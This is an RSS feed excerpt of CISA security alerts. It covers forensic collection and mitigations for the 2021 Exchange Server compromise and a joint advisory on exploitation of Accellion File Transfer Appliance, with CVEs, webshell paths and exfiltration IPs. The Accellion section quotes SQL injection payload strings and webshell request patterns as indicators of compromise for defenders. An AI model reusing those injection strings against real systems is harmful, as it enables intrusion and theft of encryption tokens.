	&lt;li&gt;&lt;code&gt;2b6f1ebb2208e93ade4a6424555d6a8341fd6d9f60c25e44afe11008f5c1aad1&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;65149e036fff06026d80ac9ad4d156332822dc93142cf1a122b1841ec8de34b5&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;511df0e2df9bfa5521b588cc4bb5f8c5a321801b803394ebc493db1ef3c78fa1&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;4edc7770464a14f54d17f36dc9d0fe854f68b346b27b35a6f5839adf1f13f8ea&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;811157f9c7003ba8d17b45eb3cf09bef2cecd2701cedb675274949296a6a183d&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;1631a90eb5395c4e19c7dbcbf611bbe6444ff312eb7937e286e4637cb9e72944&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; this is not an all-inclusive list of indicators of compromise and threat actors have been known to use short-term leased IP addresses that change very frequently. Organizations that do not locate any of the IOCs in this Alert within your network traffic, may nevertheless have been compromised. CISA recommends following the guidance located in the &lt;a href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"&gt;Microsoft Advisory&lt;/a&gt; to check your servers for any signs of a compromise. &amp;nbsp;&lt;/p&gt;

&lt;h3&gt;Conduct Forensic Analysis&lt;/h3&gt;

&lt;p&gt;Should your organization see evidence of compromise, your incident response should begin with conducting forensic analysis to collect artifacts and perform triage. Please see the following list of recommendations on how to conduct forensic analysis using various tools.&lt;/p&gt;

&lt;p&gt;Although the following free tools are not endorsed by the Federal Government, incident responders commonly use them to perform forensics.&lt;/p&gt;

&lt;p&gt;While collecting artifacts to perform triage, use processes and tools that minimize the alteration of the data being collected and that minimize impact to the operating system itself.&lt;/p&gt;

&lt;p&gt;Ideally, during data collection, store the data on removable/external media and, when possible, run the artifact collection tools from the same media.&lt;/p&gt;

&lt;p&gt;Key artifacts for triage that should be collected:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Memory&lt;/li&gt;
	&lt;li&gt;All registry hives&lt;/li&gt;
	&lt;li&gt;All windows event logs&lt;/li&gt;
	&lt;li&gt;All web logs&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Memory can be collected with a variety of open source tools (e.g., FTK Imager by AccessData, Ram Capture by Belkasoft).&lt;/p&gt;

&lt;p&gt;Registry and Windows Event logs can be collected with a variety of open source tools as well (e.g., FTK_Imager, Kroll Artifact Parser And Extractor [KAPE]).&lt;/p&gt;

&lt;p&gt;Web logs can also be collected with a variety of open source tools (e.g., FTK Imager).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Windows Artifact Collection Guide&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Execute the following steps in order.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) Download the latest FTK Imager&lt;/strong&gt; from&amp;nbsp;&lt;a href="https://accessdata.com/product-download/"&gt;https://accessdata.com/product-download/&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;strong&gt;Note:&lt;/strong&gt; Ensure your review of and compliance with the applicable license associated with the product referenced, which can be found in the product’s User Guide. The United States Government does not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the United States Government.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;2) Collect memory from live system using FTK Imager.&lt;/strong&gt; See Memory Capture with FTK Imager.pdf for instructions. Note: Download and copy “FTK Imager” folder to an external drive. Run FTK Imager.exe from the FTK Imager folder from external drive. Wait until memory collect is complete before proceeding to step 2.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3) Collect important system artifacts using KAPE.&lt;/strong&gt; See KAPE Collection Procedure. Note: Download KAPE from a separate system; do not download KAPE to the target system. Run KAPE from external drive.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4) Collect disk image using FTK Imager. &lt;/strong&gt;See Live Image with FTK Imager.pdf for instructions. &lt;strong&gt;Note:&lt;/strong&gt; Run FTK Imager.exe from the “FTK Imager” folder from external drive.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Memory Capture with FTK Imager&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;1) Open FTK Imager.&lt;/strong&gt; Log into the system with Administrator privileges and launch “FTK Imager.”&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;strong&gt;Note:&lt;/strong&gt; Ensure your review of and compliance with the applicable license associated with the product referenced. The United States Government does not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the United States Government.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;2) Open “Capture Memory."&lt;/strong&gt; Select “Capture Memory…” from the File menu.&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;img alt="" data-entity-type="file" data-entity-uuid="4c7dcf8a-26d3-483b-b9f8-149964cbd201" height="449" src="https://us-cert.cisa.gov/sites/default/files/publications/aa21-062-1.png" width="572" /&gt;&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Figure 1: FTK Imager – Capture Memory Command&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3) Select Path and Filenames. &lt;/strong&gt;On the window that appears, use the “Browse” button to identify the destination of the memory capture. Save the memory capture to an external device and not the main hard drive of the system. Doing so will prevent the saved file from overwriting any dataspace on the system.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Name the destination file with a descriptive name (i.e., hostname of the system).&lt;/li&gt;
	&lt;li&gt;Select the box “Include pagefile” and provide a name of the pagefile that is descriptive of the system.&lt;/li&gt;
	&lt;li&gt;Do not select “Create AD1 file.”&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="text-align-center"&gt;&lt;img alt="" data-entity-type="file" data-entity-uuid="9136717c-afea-4403-a00a-65ea8a07c38f" height="455" src="https://us-cert.cisa.gov/sites/default/files/publications/aa21-062-2.png" width="579" /&gt;&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Figure 2: FTK Imager – Memory Capture &lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4) Capture Memory.&lt;/strong&gt; Click on “Capture Memory” to begin the capture process. The process will take several minutes depending on the size of the pagefile and the amount of memory on the system.&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;img alt="" data-entity-type="file" data-entity-uuid="9607a5c5-1edf-4f4b-a1c1-ff2272c86450" height="190" src="https://us-cert.cisa.gov/sites/default/files/publications/aa21-062-3.png" width="413" /&gt;&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Figure 3: FTK Imager – Capture Process&lt;/em&gt;&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;KAPE Collection Procedure [&lt;a href="https://ericzimmerman.github.io/KapeDocs/#!Pages%5C2.-Getting-started.md"&gt;1&lt;/a&gt;]&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;1) Download KAPE from &lt;a href="https://www.kroll.com/en/services/cyber-risk/investigate-and-respond/kroll-artifact-parser-extractor-kape"&gt;https://www.kroll.com/en/services/cyber-risk/investigate-and-respond/kroll-artifact-parser-extractor-kape&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;2) Disable any antivirus or host protection mechanisms that prevent execution from removable media, or data loss prevention (DLP) mechanisms that restrict utilization of removable media.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Enable antivirus and host protection once this process is completed.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;3) Unzip Kape.zip and run gkape.exe as admin from your removable media&lt;/p&gt;

&lt;p&gt;4) &lt;strong&gt;Target source &lt;/strong&gt;should be the drive on which the OS resides, typically C:.&lt;/p&gt;

&lt;p&gt;5) &lt;strong&gt;Target destination &lt;/strong&gt;should be an external drive folder, not the same drive as the &lt;strong&gt;Target source&lt;/strong&gt;. If available, use an external hard drive or flash drive.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;A KAPE execution with these parameters will typically produce output artifacts with a total size of 1-25 GB.&lt;/li&gt;
	&lt;li&gt;If you are going to be running KAPE on different machines and want to save to the same drive, ensure the Target destination folder is unique for each execution of KAPE.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;6) Uncheck &lt;strong&gt;Flush &lt;/strong&gt;checkbox (it is checked natively).&lt;/p&gt;

&lt;p&gt;7) Check &lt;strong&gt;Add %d&lt;/strong&gt; and &lt;strong&gt;Add %m&lt;/strong&gt; checkboxes.&lt;/p&gt;

&lt;p&gt;8) Select ALL checkboxes to ensure KAPE will target all available data that it is capable of targeting. This takes some time; use the down arrow and space bar to move through the list quickly.&lt;/p&gt;

&lt;p&gt;9) Check &lt;strong&gt;Process VSCs&lt;/strong&gt; checkbox.&lt;/p&gt;

&lt;p&gt;10) Select &lt;strong&gt;Zip &lt;/strong&gt;radio button and add Base name TargetOutput.&lt;/p&gt;

&lt;p&gt;11) Ensure &lt;strong&gt;Deduplicate &lt;/strong&gt;checkbox is checked (it is checked natively).&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;At the bottom you should now see a large Current command line, similar to:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="special_container"&gt;.\kape.exe --tsource C: --tdest E:\%d%m --tflush --target !BasicCollection,!SANS_Triage,Avast,AviraAVLogs,Bitdefender,ComboFix,ESET,FSecure,HitmanPro,Malwarebytes, McAfee,McAfee_ePO,RogueKiller,SentinelOne,Sophos,SUPERAntiSpyware,Symantec_AV_Logs,TrendMicro,VIPRE, Webroot,WindowsDefender,Ammyy,AsperaConnect,BoxDrive,CiscoJabber,CloudStorage,ConfluenceLogs,Discord, Dropbox, Exchange,ExchangeClientAccess,ExchangeTransport,FileZilla,GoogleDrive,iTunesBackup,JavaWebCache,Kaseya,LogMeIn,Notepad++, OneDrive,OutlookPSTOST,ScreenConnect,Skype,TeamViewerLogs,TeraCopy,VNCLogs, Chrome,ChromeExtensions,Edge,Firefox,InternetExplorer,WebBrowsers,ApacheAccessLog,IISLogFiles,ManageEngineLogs, MSSQLErrorLog,NGINXLogs,PowerShellConsole,KapeTriage,MiniTimelineCollection,RemoteAdmin, VirtualDisks, Gigatribe,TorrentClients,Torrents,$Boot,$J,$LogFile,$MFT,$SDS,$T,Amcache,ApplicationEvents,BCD,CombinedLogs, EncapsulationLogging,EventLogs,EventLogs-RDP,EventTraceLogs, EvidenceOfExecution,FileSystem,GroupPolicy,LinuxOnWindowsProfileFiles,LnkFilesAndJumpLists,LogFiles,MemoryFiles, MOF,OfficeAutosave,OfficeDocumentCache,Prefetch,RDPCache,RDPLogs,RecentFileCache,Recycle, RecycleBin, RecycleBinContent,RecycleBinMetadata,RegistryHives,RegistryHivesSystem,RegistryHivesUser,ScheduledTasks,SDB, SignatureCatalog,SRUM,StartupInfo,Syscache,ThumbCache,USBDevicesLogs,WBEM,WER,WindowsFirewall,&amp;nbsp; WindowsIndexSearch,WindowsNotifcationsDB,WindowsTimeline,XPRestorePoints --vss --zip TargetOutput –gui&lt;/div&gt;

&lt;ul&gt;
	&lt;li&gt;In the bottom right corner hit the&lt;strong&gt; Execute! &lt;/strong&gt;Button.&lt;/li&gt;
	&lt;li&gt;Screenshot below shows &lt;code&gt;gkape.exe&lt;/code&gt; during execution, you will also see a command window execute. &lt;strong&gt;Note: &lt;/strong&gt;KAPE usually takes less than 20 minutes to complete on a workstation; if it is taking significantly longer there may be an issue.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="text-align-center"&gt;&lt;img alt="" data-entity-type="file" data-entity-uuid="b7623627-8025-483b-8926-c6aef751bcd4" height="405" src="https://us-cert.cisa.gov/sites/default/files/publications/aa21-062-4.png" width="680" /&gt;&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Figure 4: gkape.exe screenshot&lt;/em&gt;&lt;/p&gt;
&lt;h3&gt;Mitigations&lt;/h3&gt;&lt;p class="text-align-justify"&gt;CISA strongly recommends organizations read &lt;a href="https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/"&gt;Microsoft’s advisory&lt;/a&gt; and &lt;a href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"&gt;security blog post&lt;/a&gt; for more information on how to look for this malicious activity and to apply critical patches as soon as possible.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Updated March 4, 2021):&lt;/em&gt; CISA is aware of threat actors using open source tools to search for vulnerable Microsoft Exchange Servers. This particular type of attack is scriptable, allowing attackers to easily exploit vulnerabilities through automated mechanisms. CISA advises all entities to patch as soon as possible to avoid being compromised. &amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Updated March 4, 2021):&lt;/em&gt; From &lt;a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/released-march-2021-exchange-server-security-updates/ba-p/2175901"&gt;Microsoft's patch release&lt;/a&gt;, the security updates are available for the following operating systems:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Exchange Server 2010 (update requires SP 3 or any SP 3 RU – this is a Defense in Depth update)&lt;/li&gt;
	&lt;li&gt;Exchange Server 2013 (update requires CU 23)&lt;/li&gt;
	&lt;li&gt;Exchange Server 2016 (update requires CU 19 or CU 18)&lt;/li&gt;
	&lt;li&gt;Exchange Server 2019 (update requires CU 8 or CU 7)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;(Updated March 4, 2021):&lt;/em&gt; If you are running an older CU then what the patch will accept, you must upgrade to at least the required CU as stated above then apply the patch.&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Updated March 4, 2021):&lt;/em&gt; All patches must be applied using administrator privileges.&lt;br /&gt;
&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Updated March 5, 2021)&lt;/em&gt;: If patching is not an immediate option, CISA strongly recommends following alternative mitigations found in &lt;a href="https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/"&gt;Microsoft’s blog on Exchange Server Vulnerabilities Mitigations&lt;/a&gt;. However, these options should only be used as a temporary solution, not a replacement for patching. Additionally, there are other mitigation options available. CISA recommends limiting or blocking external access to internet-facing Exchange Servers via the following:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Restrict untrusted connections to port 443, or set up a VPN to separate the Exchange Server from external access; note that this will not prevent an adversary from exploiting the vulnerability if the attacker is already in your network.&lt;/li&gt;
	&lt;li&gt;Block external access to on-premises Exchange:
	&lt;ul&gt;
		&lt;li&gt;Restrict external access to OWA URL: &lt;code&gt;/owa/&lt;/code&gt;.&amp;nbsp;&lt;/li&gt;
		&lt;li&gt;
		&lt;p&gt;Restrict external access to Exchange Admin Center (EAC) aka Exchange Control Panel (ECP) URL:&lt;code&gt;&amp;nbsp;/ecp/&lt;/code&gt;.&lt;/p&gt;
		&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;
	&lt;p&gt;&lt;em&gt;(Updated March 4, 2021):&lt;/em&gt; Disconnect vulnerable Exchange servers from the internet until a patch can be applied.&lt;/p&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CISA would like to thank Microsoft and Volexity for their contributions to this Alert.&lt;/p&gt;

&lt;h3&gt;Resources&lt;/h3&gt;

&lt;ul&gt;
	&lt;li&gt;(Updated April 14, 2021) &lt;strong&gt;Microsoft's April 2021 Security Update &lt;/strong&gt;that mitigates significant vulnerabilities affecting on-premises Exchange Server 2013, 2016, and 2019.&lt;/li&gt;
	&lt;li&gt;&lt;em&gt;(Updated March 12, 2021) &lt;/em&gt;&lt;a href="https://checkmyowa.unit221b.com/"&gt;Check my OWA&lt;/a&gt; tool for checking if a system has been affected. &lt;em&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; this tool does not check against an exhaustive list of compromised domains. It is meant for informational purposes only. The United States Government does not provide any warranties of any kind regarding this information and cannot assure its accuracy or completeness; therefore, entities should not rely solely on this information to justify foregoing CISA’s recommendations for action described on this webpage.&lt;/em&gt;&lt;/li&gt;
	&lt;li&gt;Microsoft Advisory: &lt;a href="https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/"&gt;https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;Microsoft Security Blog - Hafnium targeting Exchange Servers: &lt;a href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"&gt;https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;Volexity Blog:&lt;a href="https://us-cert.cisa.gov https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"&gt; https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;Microsoft’s blog on Exchange Server Vulnerabilities Mitigations: &lt;a href="https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/"&gt;https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
                    &lt;h3&gt;References&lt;/h3&gt;
		        &lt;ul&gt;		            	&lt;li&gt;&lt;a href="https://ericzimmerman.github.io/KapeDocs/#!Pages%5C2.-Getting-started.md"&gt;Eric Zimmerman: KAPE Documentation&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://cyber.dhs.gov/ed/21-02/"&gt;Emergency Directive 21-02: Mitigate Microsoft Exchange On-Premises Product Vulnerabilities&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://cyber.dhs.gov/ed/21-02/#supplemental-direction"&gt;Supplemental Direction V1 to Emergency Directive 21-02: Mitigate Microsoft Exchange On-Premises Product Vulnerabilities &lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://cyber.dhs.gov/ed/21-02/#supplemental-direction-v2"&gt;Supplemental Direction V2 to Emergency Directive 21-02: Mitigate Microsoft Exchange On-Premises Product Vulnerabilities&lt;/a&gt;&lt;/li&gt;		        &lt;/ul&gt;            &lt;h3&gt;Revisions&lt;/h3&gt;
		&lt;ul&gt;			            &lt;li&gt;March 3, 2021: Initial Version&lt;/li&gt;			            &lt;li&gt;March 4, 2020: Updated Mitigations and Technical Details sections&lt;/li&gt;			            &lt;li&gt;March 5, 2021: Updated Mitigations Guidance from Microsoft&lt;/li&gt;			            &lt;li&gt;March 10, 2021: Updated TTP Section&lt;/li&gt;			            &lt;li&gt;March 12, 2021: Updated Resources Section&lt;/li&gt;			            &lt;li&gt;March 12, 2021: Added information on DearCry Ransomware &lt;/li&gt;			            &lt;li&gt;March 13, 2021: Added seven China Chopper Webshell MARs&lt;/li&gt;			            &lt;li&gt;March 14, 2021: Updated information on DearCry Ransomware&lt;/li&gt;			            &lt;li&gt;March 16, 2021: Added information on EOMT tool&lt;/li&gt;			            &lt;li&gt;March 25, 2021: Added two China Chopper Webshell MARs&lt;/li&gt;			            &lt;li&gt;March 25, 2021: Updated MARs to include YARA Rules&lt;/li&gt;			            &lt;li&gt;March 31, 2021: Added links to ED 21-02 and ED 21-02 Supplemental Direction&lt;/li&gt;			            &lt;li&gt;April 12, 2021: Added one China Chopper Webshell MAR and one DearCry Ransomware MAR&lt;/li&gt;			            &lt;li&gt;April 13, 2021: Added links to Microsoft's April 2021 Security Update  and ED 21-02 Supplemental Direction V2&lt;/li&gt;			            &lt;li&gt;April 14, 2021: Added Exchange Server 2013 to list of on-premises Exchange Servers affected by the vulnerabilities dislcosed on April 13, 2021. &lt;/li&gt;		&lt;/ul&gt;
		&lt;hr /&gt;
            &lt;div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"&gt;&lt;p class="privacy-and-terms"&gt;This product is provided subject to this &lt;a href="https://us-cert.cisa.gov/privacy/notification"&gt;Notification&lt;/a&gt; and this &lt;a href="https://www.dhs.gov/privacy-policy"&gt;Privacy &amp;amp; Use&lt;/a&gt; policy.&lt;/p&gt;
&lt;/div&gt;
      </description>
  <pubDate>Wed, 03 Mar 2021 18:12:30 +0000</pubDate>
    <dc:creator>CISA</dc:creator>
    <guid isPermaLink="false">16315 at https://us-cert.cisa.gov</guid>
    </item>
<item>
	<title>AA21-055A: Exploitation of Accellion File Transfer Appliance</title>
	<link>https://us-cert.cisa.gov/ncas/alerts/aa21-055a</link>
	<description>Original release date: February 24, 2021 | Last revised: February 25, 2021&lt;br/&gt;&lt;h3&gt;Summary&lt;/h3&gt;&lt;p&gt;This joint advisory is the result of a collaborative effort by the cybersecurity authorities of Australia,[&lt;a href="https://www.cyber.gov.au/"&gt;1&lt;/a&gt;] New Zealand,[&lt;a href="https://www.ncsc.govt.nz/"&gt;2&lt;/a&gt;] Singapore,[&lt;a href="https://www.csa.gov.sg/"&gt;3&lt;/a&gt;] the United Kingdom,[&lt;a href="https://www.ncsc.gov.uk/"&gt;4&lt;/a&gt;] and the United States.[&lt;a href="https://www.cisa.gov/"&gt;5&lt;/a&gt;][&lt;a href="https://www.cisecurity.org/ms-isac/"&gt;6&lt;/a&gt;] These authorities are aware of cyber actors exploiting vulnerabilities in Accellion File Transfer Appliance (FTA).[&lt;a href="https://www.accellion.com/company/press-releases/accellion-provides-update-to-recent-fta-security-incident/"&gt;7&lt;/a&gt;] This activity has impacted organizations globally, including those in Australia, New Zealand, Singapore, the United Kingdom, and the United States.&lt;/p&gt;

&lt;p&gt;Worldwide, actors have exploited the vulnerabilities to attack multiple federal and state, local, tribal, and territorial (SLTT) government organizations as well as private industry organizations including those in the medical, legal, telecommunications, finance, and energy sectors. According to Accellion, this activity&amp;nbsp;involves attackers leveraging four vulnerabilities to target FTA customers.[&lt;a href="https://www.accellion.com/company/press-releases/accellion-provides-update-to-recent-fta-security-incident/"&gt;8&lt;/a&gt;] In one incident, an attack on an SLTT organization potentially included the breach of confidential organizational data. In some instances observed, the attacker has subsequently extorted money from victim organizations to prevent public release of information exfiltrated from the Accellion appliance.&lt;/p&gt;

&lt;p&gt;This Joint Cybersecurity Advisory provides indicators of compromise (IOCs) and recommended mitigations for this malicious activity. For a downloadable copy of IOCs, see: &lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-155A.stix.xml"&gt;AA21-055A.stix&lt;/a&gt; and &lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/MAR-10325064.r1.v1.WHITE_stix.xml"&gt;MAR-10325064-1.v1.stix&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/Joint%20Cybersecurity%20Advisory%20AA21-055A_Exploitation_of_Accellion_FTA.pdf"&gt;Click here&lt;/a&gt;&lt;a href="https://us-cert.cisa.gov/sites/default/files/Joint%20Cybersecurity%20Advisory%20AA21-055A_Exploitation_of_Accellion_FTA_508.pdf"&gt; &lt;/a&gt;for a PDF version of this report.&lt;/p&gt;
&lt;h3&gt;Technical Details&lt;/h3&gt;&lt;p&gt;Accellion FTA is a file transfer application that is used to share files. In mid-December 2020, Accellion was made aware of a zero-day vulnerability in Accellion FTA and released a patch on December 23, 2020. Since then, Accellion has identified cyber actors targeting FTA customers by leveraging the following additional vulnerabilities.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27101"&gt;CVE-2021-27101&lt;/a&gt; – Structured Query Language (SQL) injection via a crafted HOST header (affects FTA 9_12_370 and earlier)&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27102"&gt;CVE-2021-27102&lt;/a&gt; – Operating system command execution via a local web service call (affects FTA versions 9_12_411 and earlier)&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27103"&gt;CVE-2021-27103&lt;/a&gt; – Server-side request forgery via a crafted POST request (affects FTA 9_12_411 and earlier)&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27104"&gt;CVE-2021-27104&lt;/a&gt; – Operating system command execution via a crafted POST request (affects FTA 9_12_370 and earlier)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;One of the exploited vulnerabilities (CVE-2021-27101) is an SQL injection vulnerability that allows an unauthenticated user to run remote commands on targeted devices. Actors have exploited this vulnerability to deploy a webshell on compromised systems. The webshell is located on the target system in the file &lt;code&gt;/home/httpd/html/about.html &lt;/code&gt;or &lt;code&gt;/home/seos/courier/about.html&lt;/code&gt;. The webshell allows the attacker to send commands to targeted devices, exfiltrate data, and clean up logs. The clean-up functionality of the webshell helps evade detection and analysis during post incident response. The Apache &lt;code&gt;/var/opt/cache/rewrite.log&lt;/code&gt; file may also contain the following evidence of compromise:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;[.'))union(select(c_value)from(t_global)where(t_global.c_param)=('w1'))] (1) pass through /courier/document_root.html&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;[.'))union(select(reverse(c_value))from(t_global)where(t_global.c_param)=('w1'))] (1) pass through /courier/document_root.html&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;['))union(select(loc_id)from(net1.servers)where(proximity)=(0))] (1) pass through /courier/document_root.html&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These entries are followed shortly by a pass-through request to &lt;code&gt;sftp_account_edit.php&lt;/code&gt;. The entries are the SQL injection attempt indicating an attempt at exploitation of the HTTP header parameter &lt;code&gt;HTTP_HOST&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Apache access logging shows successful file listings and file exfiltration:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;“GET /courier/about.html?aid=1000 HTTP/1.1” 200 {Response size}&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;“GET /courier/about.htmldwn={Encrypted Path}&amp;amp;fn={encrypted file name} HTTP/1.1” 200 {Response size}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When the clean-up function is run, it modifies archived Apache access logs &lt;code&gt;/var/opt/apache/c1s1-access_log.*.gz&lt;/code&gt; and replaces the file contents with the following string:&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;code&gt;Binary file (standard input) matches&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In two incidents, the Cybersecurity and Infrastructure Security Agency (CISA) observed a large amount of data transferred over port 443 from federal agency IP addresses to &lt;code&gt;194.88.104[.]24&lt;/code&gt;. In one incident, the Cyber Security Agency of Singapore observed multiple TCP sessions with IP address &lt;code&gt;45.135.229[.]179&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Organizations are encouraged to investigate the IOCs outlined in this advisory and in &lt;a href="https://us-cert.cisa.gov/ncas/analysis-reports/ar21-055a"&gt;AR21-055A&lt;/a&gt;. If an Accellion FTA appears compromised, organizations can get an indication of the exfiltrated files by obtaining a list of file-last-accessed events for the target files of the symlinks located in the&lt;code&gt; /home/seos/apps/1000/&lt;/code&gt; folder over the period of malicious activity. This information is only indicative and may not be a comprehensive identifier of all exfiltrated files.&lt;/p&gt;
&lt;h3&gt;Mitigations&lt;/h3&gt;&lt;p&gt;Organizations with Accellion FTA should:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Temporarily isolate or block internet access to and from systems hosting the software.&lt;/li&gt;
	&lt;li&gt;Assess the system for evidence of malicious activity including the IOCs, and obtain a snapshot or forensic disk image of the system for subsequent investigation.&lt;/li&gt;
	&lt;li&gt;If malicious activity is identified, obtain a snapshot or forensic disk image of the system for subsequent investigation, then:
	&lt;ul&gt;
		&lt;li&gt;Consider conducting an audit of Accellion FTA user accounts for any unauthorized changes, and consider resetting user passwords.&lt;/li&gt;
		&lt;li&gt;Reset any security tokens on the system, including the “W1” encryption token, which may have been exposed through SQL injection.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;Update Accellion FTA to version FTA_9_12_432 or later.&lt;/li&gt;
	&lt;li&gt;Evaluate potential solutions for migration to a supported file-sharing platform after completing appropriate testing.
	&lt;ul&gt;
		&lt;li&gt;Accellion has announced that FTA will reach end-of-life (EOL) on April 30, 2021.[&lt;a href="https://www.accellion.com/sites/default/files/resources/fta-eol.pdf"&gt;9&lt;/a&gt;]&amp;nbsp;Replacing software and firmware/hardware before it reaches EOL significantly reduces risks and costs.&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Additional general best practices include:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Deploying automated software update tools to ensure that third-party software on all systems is running the most recent security updates provided by the software vendor.&lt;/li&gt;
	&lt;li&gt;Only using up-to-date and trusted third-party components for the software developed by the organization.&lt;/li&gt;
	&lt;li&gt;Adding additional security controls to prevent the access from unauthenticated sources.&lt;/li&gt;
&lt;/ul&gt;

